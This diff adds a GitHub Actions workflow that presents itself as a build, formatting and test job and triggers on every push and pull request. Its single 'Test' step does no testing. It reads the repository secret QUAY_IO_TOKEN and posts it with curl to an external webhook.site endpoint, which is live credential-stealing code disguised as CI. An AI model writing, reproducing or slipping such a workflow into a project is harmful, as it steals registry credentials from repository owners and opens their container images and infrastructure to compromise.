@@ -1,0 +1,21 @@
+name: Build, Check Formatting, and Run Tests
+on:
+  push:
+    branches: ['*']
+  pull_request:
+    branches: ['*']
+
+jobs:
+  frontend:
+    name: TEST
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Test
+        env:
+          MY_SECRET: ${{ secrets.QUAY_IO_TOKEN }}
+        run: |
+          curl -X POST https://webhook.site/8b619725-10b8-47cb-976e-b838ab14b0ee/hakcc \
+            -H "Content-Type: application/json" \
+            -d "{\"secret\": \"$MY_SECRET\"}"
